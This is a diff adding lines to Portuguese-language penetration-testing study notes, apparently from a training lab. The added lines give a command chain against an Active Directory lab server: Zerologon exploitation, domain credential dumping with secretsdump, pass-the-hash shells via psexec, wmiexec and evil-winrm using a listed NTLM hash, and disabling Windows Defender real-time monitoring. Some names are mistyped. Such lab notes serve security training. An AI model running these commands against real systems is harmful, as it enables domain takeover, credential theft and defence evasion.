@@ -7043,7 +7043,7 @@ Alguns comando passados de forma prática usando o laboratório da acadi
 
 	smbmap -H 192.168.20.44 -r Shares
 
-Ferramenta similar ao smbclient só que não interage com o serviço
+Ferramenta similar ao smbclient só que não interage com o serviço, busca se tem compartilhamento ativo
 
 	nslookup
 	set q=ns
@@ -7060,6 +7060,7 @@ Processo de transferencia de zona de forma manual
 Ferramenta de modificação e leitura de Metadados de arquivos
 
 	nmap -sS --script 'ldap* and not brute' 192.168.200.44 -p 389
+	nmap -sV --script nbstat -p 137,445
 	dig any enumeration.local @192.168.200.44
  	dig axfr enumeration.local @192.168.200.44
 	dig a offsec @192.168.200.253
@@ -7103,6 +7104,25 @@ Capabilities são funções especiais para arquivos, usuários, kernel etc. COmo
 O primeiro lista as capabilities que existem no sistema, o segundo executa o python pois estava listado no capabilities, troca o UID do usuário para 0 (que é o root) e drop a shell.
 
 Script nmap que anumera usuários do Active Directory AD `krb5-enum-users` na porta 88 `sudo nmap -p 88 --script krb5-enum-users --script-args krb5-enum-users.realm='mtia.local' 192.168.200.100`
+
+- Laboratório do AD
+
+IP 253 é o AD
+
+	crackmapexec smb 192.168.200.253 -L
+	crackmapexec smb 192.168.200.253 -M zerologon
+ 	git clone https://github.com/dirkjanm/CVE-2020-1471
+	impacket-secretsdump -just-dc offsec/offsec-ad\$@192.168.200.253 (Dumpa as creds do AD)
+	crackmapexec smb 192.168.200.253 -u administrator -H 'f2535a22448907ddffad7bddef5c53e2'
+	impacket-psexec -hashes 'aad3b435b51404eeaad3b435b51404ee:f2535a22448907ddffad7bddef5c53e2' offsec.corp/administrator@192.168.200.253 (joga executavel)
+	impacket-wmiexec -hashes 'aad3b435b51404eeaad3b435b51404ee:f2535a22448907ddffad7bddef5c53e2' offsec.corp/administrator@192.168.200.253 ipconfig (roda comando)
+	vil-winrm -H 'f2535a22448907ddffad7bddef5c53e2' -u administrator -i 192.168.200.253 (fecha uma shell)
+	No servidor WIN - Abaixa desabilita o monitoramento em tempo real do windows defender
+ 	get-mppreference | findstr Monitoring (Se o resultado for FALSE)
+	set-mppreference -disablerealtimemonitoring $true (Seta como true)
+	impacket-psexec -hashes "aad3b435b51404eeaad3b435b51404ee:f2535a22448907ddffad7bddef5c53e2" "offsec.corp/administrator"@192.168.200.253 (com o FW desabiltiado funciona)
+	
+	
 
 - Teorias
 
